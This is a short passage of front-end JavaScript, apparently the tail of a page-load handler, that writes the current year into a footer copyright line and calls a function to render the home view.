  document.getElementById('footer-year').textContent=`© ${new Date().getFullYear()}`;
  renderHome();
});
